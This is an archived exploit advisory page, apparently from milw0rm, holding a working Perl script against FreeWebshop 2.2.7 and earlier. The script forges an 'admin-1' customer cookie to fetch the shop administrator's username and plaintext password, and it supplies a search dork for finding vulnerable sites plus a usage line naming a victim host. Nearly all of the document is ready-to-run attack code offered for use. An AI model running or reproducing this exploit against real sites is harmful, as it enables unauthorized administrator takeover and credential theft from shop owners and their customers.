<html><head><title>FreeWebshop <= 2.2.7 (cookie) Admin Password Grabber Exploit</title></head><pre>#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# FreeWebshop &lt;= 2.2.7 - (cookie) Admin Password Grabber Exploit
# Waktu			:  Dec 17 2007 04:50AM
# Software		:  FreeWebshop &lt;= 2.2.7
# Vendor		:  http://www.freewebshop.org/
# Demo Site		:  http://www.freewebshop.org/demo/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
# Dork			:  &quot;Powered by FreeWebshop&quot;
#
# Terima Kasih untuk;
# -[opt1lc, fl3xu5, ghoz]-
# str0ke, DNX, xoron, cyb3rh3b, K-159, the_hydra, y3dips
# nyubi,iFX,sin~X,kin9k0ng,bius,selikoer,aldy_BT
# Komunitas Security dan Hacker Indonesia
#
# ----------------------------[Cookie Injection]------------------------------------
use LWP::UserAgent;
use HTTP::Cookies;

if(!$ARGV[1])
{
 print &quot;\n  |-------------------------------------------------|&quot;;
 print &quot;\n  |         Indonesian Newhack Technology           |&quot;;
 print &quot;\n  |-------------------------------------------------|&quot;;
 print &quot;\n  |FreeWebshop 2.2.7 (cookie) Admin Password Grabber|&quot;;
 print &quot;\n  |     Found by k1tk4t [k1tk4t(at)newhack.org]     |&quot;;
 print &quot;\n  |-------------------------------------------------|&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n[!] Penggunaan : perl freewebshop227.pl [URL] [Path] &quot;;
 print &quot;\n[!] Contoh     : perl freewebshop227.pl http://korban.site /WebShop/&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n&quot;;
 exit;
}

my $site = $ARGV[0]; # Site Target
my $path = $ARGV[1]; # Path direktori envolution_1-0-1

my $www = new LWP::UserAgent;
#my @cookie = ('Cookie' =&gt; &quot;cookie_info=admin-1&quot;); #Untuk Versi &lt; = 2.2.4
my @cookie = ('Cookie' =&gt; &quot;fws_cust=admin-1&quot;); #Untuk Versi &gt; = 2.2.6
my $http = &quot;$site/$path/index.php?page=customer&amp;action=show&quot;;
print &quot;\n\n [~] Sedang Mencari Username dan Password.... \n&quot;;
my $injek = $www -&gt; get($http, @cookie);
my $jawaban = $injek -&gt; content;
if( $jawaban =~ /login value='(.*)'/ ){ print &quot;\n [+] Username: $1&quot;; 
$jawaban =~ /&quot;password&quot; name=&quot;pass1&quot; size=&quot;10&quot; maxlength=&quot;10&quot; value=&quot;(.*)&quot;/ , print &quot;\n [+] Password: $1 \n&quot;;} 
else {print &quot;\n [-] Gagal  :(  , Coba yang lain!&quot;;}

# ----------------------------[Selesai]------------------------------------

# milw0rm.com [2007-12-18]</pre></html>